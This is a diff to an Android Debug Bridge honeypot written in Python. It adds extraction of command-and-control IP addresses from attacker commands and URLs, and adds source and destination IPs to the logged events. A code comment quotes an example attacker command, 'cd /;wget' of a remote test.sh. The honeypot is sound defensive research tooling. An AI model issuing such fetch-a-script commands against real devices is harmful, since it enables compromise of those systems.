@@ -17,6 +17,7 @@ import os
 import requests
 from requests import RequestException
 from urllib.parse import urlparse
+import ipaddress
 
 #package imports
 from .config import CONFIG, OUTPUT_PLUGINS
@@ -30,6 +31,28 @@ MAX_READ_COUNT = 4096 * 4096
 # sleep 1 second after each empty packets, wait 1 hour in total
 MAX_EMPTY_PACKETS = 360
 IDLE_TIMEOUT = 300 # seconds
+
+# Regex to extract IPv4 addresses
+IP_REGEX = re.compile(
+    r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
+    r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
+)
+
+def extract_ips_from_text(text):
+    """Extract all IPv4 addresses from text."""
+    return list(set(IP_REGEX.findall(text)))
+
+def extract_c2_from_url(url):
+    """Extract host IP from URL if it's an IP address."""
+    try:
+        parsed = urlparse(url)
+        host = parsed.hostname
+        if host:
+            ipaddress.ip_address(host)  # Validate it's an IP
+            return host
+    except (ValueError, TypeError):
+        pass
+    return None
 
 DEVICE_ID = CONFIG.get('honeypot', 'device_id')
 log_q = Queue.Queue()
@@ -74,7 +97,7 @@ class UrlDownloader(threading.Thread):
             os.makedirs(DL_DIR)
         while not download_q.empty() or self.process:
             try:
-                url, session = download_q.get(timeout=.1)
+                url, session, src_ip, dst_ip = download_q.get(timeout=.1)
                 filename = os.path.basename(urlparse(url).path)
             except Queue.Empty:
                 continue
@@ -92,15 +115,19 @@ class UrlDownloader(threading.Thread):
             fn = '{}.raw'.format(sha256sum)
             fp = os.path.join(DL_DIR, fn)
 
-            logger.info('File downloaded: {}, name: {}, bytes: {}'.format(fp, filename, len(data)))
+            c2_ip = extract_c2_from_url(url)
             obj = {
                 "eventid": "adbhoney.session.file_download",
                 "src_url": url,
+                "src_ip": src_ip,
+                "dst_ip": dst_ip,
                 "shasum": sha256sum,
                 "outfile": fp,
                 "filename": filename,
-                "session" : session
+                "session": session
             }
+            if c2_ip:
+                obj["c2_ip"] = c2_ip
             #Don't overwrite the file if it already exists
             if not os.path.exists(fp):
                 with open(fp, 'wb') as file_out:
@@ -259,10 +286,10 @@ class ADBConnection(threading.Thread):
         sha256sum = hashlib.sha256(f['data']).hexdigest()
         fn = '{}.raw'.format(sha256sum)
         fp = os.path.join(DL_DIR, fn)
-        logger.info('File uploaded: {}, name: {}, bytes: {}'.format(fp, f['name'], len(f['data'])))
         obj = {
             "eventid": "adbhoney.session.file_upload",
             "src_ip": self.addr[0],
+            "dst_ip": self.dst_ip,
             "shasum": sha256sum,
             "outfile": fp,
             "filename": f['name']
@@ -343,7 +370,6 @@ class ADBConnection(threading.Thread):
         #command will be 'shell:cd /;wget http://someresource.com/test.sh\x00'
         #Remove first six chars and last null byte.
         cmd = str(message.data[6:-1], "utf-8")
-        logger.info("shell command is {}, len {}".format(cmd, len(cmd)))
         if cmd in cmd_responses:
             response = cmd_responses[cmd]
         else:
@@ -352,29 +378,31 @@ class ADBConnection(threading.Thread):
         # change the WRTE contents with whatever you'd like to send to the attacker
         self.send_message(protocol.CMD_WRTE, 2, message.arg0, response)
         self.send_message(protocol.CMD_CLSE, 2, message.arg0, '')
-        # print the shell command that was sent
-        # also remove trailing \00
-        logger.info('{}\t{}'.format(self.addr[0], message.data[:-1]))
+
+        c2_ips = extract_ips_from_text(cmd)
         obj = {
             "eventid": "adbhoney.command.input",
             "input": cmd,
             "src_ip": self.addr[0],
+            "dst_ip": self.dst_ip,
         }
+        if c2_ips:
+            obj["c2_ips"] = c2_ips
         self.report(obj)
         if(self.http_download):
             for url in self.url_regex.findall(cmd):
-                download_q.put((url[0],self.session),timeout=.1)
+                download_q.put((url[0], self.session, self.addr[0], self.dst_ip), timeout=.1)
 
     def process_connection(self):
         start = time.time()
         self.session = str(binascii.hexlify(os.urandom(6)), "utf-8")
-        localip = socket.gethostbyname(socket.gethostname())
+        self.dst_ip = self.conn.getsockname()[0]
         logger.info('{} connection start ({})'.format(self.addr[0], self.session))
         obj = {
             "eventid": "adbhoney.session.connect",
             "src_ip": self.addr[0],
             "src_port": self.addr[1],
-            "dst_ip": localip,
+            "dst_ip": self.dst_ip,
             "dst_port": CONFIG.get('honeypot', 'port'),
         }
         self.report(obj)
@@ -473,6 +501,7 @@ class ADBConnection(threading.Thread):
         obj = {
             'eventid': 'adbhoney.session.closed',
             'src_ip': self.addr[0],
+            'dst_ip': self.dst_ip,
             'duration': '{0:.2f}'.format(duration),
         }
         self.report(obj)
